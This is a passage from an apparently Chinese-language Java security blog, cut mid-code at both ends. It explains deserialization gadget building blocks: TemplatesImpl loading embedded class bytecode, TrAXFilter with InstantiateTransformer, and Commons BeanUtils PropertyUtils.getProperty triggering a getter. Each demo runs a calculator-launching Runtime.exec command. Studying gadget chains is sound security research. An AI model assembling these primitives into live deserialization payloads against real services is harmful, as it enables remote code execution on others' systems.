class="number">0</span> ,<span class="number">25</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">0</span> ,<span class="number">14</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">58</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">22</span> ,</span><br><span class="line">            <span class="number">42</span> ,-<span class="number">73</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">72</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">18</span> ,<span class="number">3</span> ,-<span class="number">74</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">76</span> ,-<span class="number">78</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">5</span> ,<span class="number">18</span> ,<span class="number">6</span> ,-<span class="number">74</span> ,<span class="number">0</span> ,<span class="number">7</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">20</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">20</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">21</span> ,&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;testClassBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">TrAXFilter</span> <span class="variable">trAXFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrAXFilter</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>HelloTemplatesImpl的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span></span><br><span class="line"><span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span><br><span class="line"><span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>InstantiateTransformer的transform方法会执行传入类的构造函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>


<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 18:53</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_InstantiateTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        transformers.transform(hello.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hello代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了InstantiateTransformer和TrAXFilter可以进行组合，进行执行字节码。<br>简要代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
      </tags>
  </entry>
  <entry>
    <title>CB基础知识</title>
    <url>/2023/02/27/CB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="CB基础知识"><a href="#CB基础知识" class="headerlink" title="CB基础知识"></a>CB基础知识</h2><p>简单整理一下CB的基础知识。</p>
<span id="more"></span>

<h3 id="getProperty"><a href="#getProperty" class="headerlink" title="getProperty"></a>getProperty</h3><p>getProperty是org.apache.commons.beanutils包提供的一个静态方法PropertyUtils.getProperty().他的构造函数的参数为Object bean, String name。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>使用一下测试类来验证PropertyUtils.getProperty()的作用。</p>
<hr>
<p>注意：</p>
<ul>
<li>javabean的getter的类型是T，不能是void。</li>
<li>javabean的setter的类型是void。</li>
<li>PropertyUtils.getProperty(Object bean, String name)，调用的name需要无参。（暂时这样理解，不确定是不是也可以构造有参的,后续有其他了解，再进行补充。）</li>
</ul>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/27 14:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My_bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">My_bean</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getExec</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行下方代码可成功弹计算机。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/27 14:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_commons_beanutils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;My_bean&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ct1</span> <span class="operator">=</span> c1.getDeclaredConstructor();<span class="comment">//不会初始化，无参构造</span></span><br><span class="line">        ct1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ct1.newInstance();<span class="comment">//初始化执行</span></span><br><span class="line">        PropertyUtils.getProperty(obj,<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>CB基础知识，这里为什么讲TemplatesImpl呢，因为TemplatesImpl里包含多个<strong>getter</strong>、<strong>setter</strong>，首先先介绍一下TemplatesImpl如何执行字节码吧。</p>
<hr>
<ul>
<li>TemplatesImpl中的TransletClassLoader类，重写了defineClass方法，并且不是protected类型的,可以被外部调用.</li>
<li>newTransformer可以调用到defineClass，导致执行字节码。（入口1）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">defineClass:<span class="number">185</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">414</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">451</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:<span class="number">106</span>, Test_commons_beanutils (ysoserial)</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/27 14:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_commons_beanutils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span> ,-<span class="number">2</span> ,-<span class="number">70</span> ,-<span class="number">66</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">52</span> ,<span class="number">0</span> ,<span class="number">47</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">0</span> ,<span class="number">22</span> ,</span><br><span class="line">            <span class="number">10</span> ,<span class="number">0</span> ,<span class="number">23</span> ,<span class="number">0</span> ,<span class="number">24</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">23</span> ,<span class="number">0</span> ,<span class="number">26</span> ,<span class="number">9</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">27</span> ,<span class="number">0</span> ,<span class="number">28</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">29</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">30</span> ,<span class="number">0</span> ,<span class="number">31</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">32</span> ,<span class="number">7</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">33</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">102</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">109</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">114</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">68</span> ,</span><br><span class="line">            <span class="number">79</span> ,<span class="number">77</span> ,<span class="number">59</span> ,<span class="number">91</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">114</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">72</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">100</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">67</span> ,</span><br><span class="line">            <span class="number">111</span> ,<span class="number">100</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">76</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">101</span> ,<span class="number">78</span> ,<span class="number">117</span> ,<span class="number">109</span> ,<span class="number">98</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">114</span> ,<span class="number">84</span> ,<span class="number">97</span> ,<span class="number">98</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">34</span> ,<span class="number">1</span> ,<span class="number">0</span> ,-<span class="number">90</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">68</span> ,<span class="number">79</span> ,<span class="number">77</span> ,<span class="number">59</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">100</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">68</span> ,<span class="number">84</span> ,<span class="number">77</span> ,<span class="number">65</span> ,<span class="number">120</span> ,<span class="number">105</span> ,<span class="number">115</span> ,<span class="number">73</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">114</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">72</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">100</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">60</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">110</span> ,<span class="number">105</span> ,<span class="number">116</span> ,<span class="number">62</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">40</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">35</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">10</span> ,<span class="number">83</span> ,<span class="number">111</span> ,<span class="number">117</span> ,<span class="number">114</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">70</span> ,<span class="number">105</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">23</span> ,</span><br><span class="line">            <span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">46</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">7</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">36</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">37</span> ,<span class="number">0</span> ,<span class="number">38</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">40</span> ,<span class="number">111</span> ,<span class="number">112</span> ,<span class="number">101</span> ,<span class="number">110</span> ,<span class="number">32</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">83</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span 